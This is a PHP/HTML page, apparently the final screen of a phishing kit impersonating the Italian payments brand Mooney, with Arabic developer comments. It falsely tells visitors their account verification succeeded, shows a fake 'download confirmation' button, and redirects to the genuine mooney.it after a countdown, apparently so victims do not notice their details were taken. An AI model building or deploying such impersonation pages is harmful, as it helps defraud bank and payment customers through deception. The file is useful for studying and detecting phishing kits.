<?php
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Operazione Completata</title>
    <!-- إضافة Favicon -->
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* Success Animation */
        .success-animation {
            position: relative;
            margin: 30px 0;
            height: 180px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .success-circle {
            width: 140px;
            height: 140px;
            background: #FFCC00;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 15px 40px rgba(255, 204, 0, 0.4);
            position: relative;
            animation: successPulse 2s ease-in-out infinite;
        }
        
        .success-circle::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 2px solid rgba(255, 204, 0, 0.2);
            border-radius: 50%;
            animation: ripple 2s linear infinite;
        }
        
        .success-circle::after {
            content: '';
            position: absolute;
            top: -20px;
            left: -20px;
            right: -20px;
            bottom: -20px;
            border: 1px solid rgba(255, 204, 0, 0.1);
            border-radius: 50%;
            animation: ripple 2s linear infinite 0.5s;
        }
        
        .success-icon {
            font-size: 60px;
            color: white;
            font-weight: bold;
            position: relative;
            z-index: 2;
        }
        
        @keyframes successPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        @keyframes ripple {
            0% { transform: scale(0.8); opacity: 1; }
            100% { transform: scale(1.3); opacity: 0; }
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 32px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 18px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Success Details */
        .success-details {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            width: 100%;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #eee;
        }
        
        .detail-item:last-child {
            border-bottom: none;
        }
        
        .detail-label {
            font-weight: 600;
            color: #4F4F4F;
            font-size: 14px;
        }
        
        .detail-value {
            font-weight: 700;
            color: #FFCC00;
            font-size: 14px;
        }
        
        /* Countdown Timer */
        .countdown-section {
            background: #f8f8f8;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            width: 100%;
            text-align: center;
            border: 1px solid #ddd;
        }
        
        .countdown-text {
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .countdown-timer {
            font-size: 42px;
            font-weight: 700;
            color: #FFCC00;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
        }
        
        .countdown-label {
            font-size: 14px;
            color: #4F4F4F;
            font-weight: 500;
        }
        
        /* Progress Bar */
        .progress-container {
            width: 100%;
            height: 6px;
            background: #e9ecef;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            width: 100%;
            height: 100%;
            background: #FFCC00;
            border-radius: 10px;
            animation: progressFill 5s ease-in-out;
            transform-origin: left;
        }
        
        @keyframes progressFill {
            0% { transform: scaleX(0); }
            100% { transform: scaleX(1); }
        }
        
        /* Action Buttons */
        .action-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin: 30px 0 20px;
            width: 100%;
        }
        
        .btn-primary {
            background: #FFCC00;
            color: #333;
            border: none;
            padding: 18px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        
        .btn-primary:hover {
            background: #e6b800;
        }
        
        .btn-secondary {
            background: white;
            color: #008085;
            border: 2px solid #008085;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        
        .btn-secondary:hover {
            background: #008085;
            color: white;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
            width: 100%;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 28px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .success-circle {
                width: 120px;
                height: 120px;
            }
            
            .success-icon {
                font-size: 50px;
            }
            
            .countdown-timer {
                font-size: 36px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .success-circle {
                width: 100px;
                height: 100px;
            }
            
            .success-icon {
                font-size: 40px;
            }
            
            .countdown-timer {
                font-size: 32px;
            }
            
            .success-details {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- Success Animation -->
        <div class="success-animation">
            <div class="success-circle">
                <div class="success-icon">✓</div>
            </div>
        </div>
        
        <!-- Title -->
        <h1>Operazione Completata</h1>
        <p class="subtitle">
            La tua verifica è stata completata con successo.<br>
            Il tuo account è ora protetto e attivo.
        </p>
        
        <!-- Success Details -->
        <div class="success-details">
            <div class="detail-item">
                <span class="detail-label">Stato Account:</span>
                <span class="detail-value">VERIFICATO</span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Livello Sicurezza:</span>
                <span class="detail-value">MASSIMO</span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Data Verifica:</span>
                <span class="detail-value"><?php echo date('d/m/Y'); ?></span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Ora Verifica:</span>
                <span class="detail-value"><?php echo date('H:i'); ?></span>
            </div>
        </div>
        
        <!-- Countdown Timer -->
        <div class="countdown-section">
            <div class="countdown-text">Reindirizzamento automatico tra:</div>
            <div class="countdown-timer" id="countdown">5</div>
            <div class="countdown-label">secondi</div>
            
            <!-- Progress Bar -->
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
        </div>
        
        <!-- Action Buttons -->
        <div class="action-buttons">
            <button class="btn-primary" onclick="redirectToHome()">
                VAI ALLA HOME BANKING
            </button>
            
            <button class="btn-secondary" onclick="downloadConfirmation()">
                SCARICA CONFERMA
            </button>
        </div>
        
        <!-- Security Info -->
        <div class="security-info">
            <div class="security-icon">🛡️</div>
            <div class="security-title">Account Protetto</div>
            <p class="security-description">
                Hai completato con successo tutti i processi di verifica.
                Il tuo account Mooney è ora completamente attivo e protetto.
            </p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // العد التنازلي والتوجيه التلقائي
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            
            const countdownTimer = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownTimer);
                    redirectToHome();
                }
            }, 1000);

            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);
        });

        // وظائف الأزرار
        function redirectToHome() {
            window.location.href = 'https://www.mooney.it/';
        }

        function downloadConfirmation() {
            // محاكاة تحميل التأكيد
            const btn = event.target;
            const originalText = btn.innerHTML;
            
            btn.innerHTML = 'DOWNLOAD IN CORSO...';
            btn.disabled = true;
            
            setTimeout(() => {
                btn.innerHTML = 'DOWNLOAD COMPLETATO';
                btn.style.background = '#008085';
                btn.style.color = 'white';
                
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                    btn.style.background = '';
                    btn.style.color = '';
                }, 2000);
            }, 2000);
        }
    </script>
</body>
</html>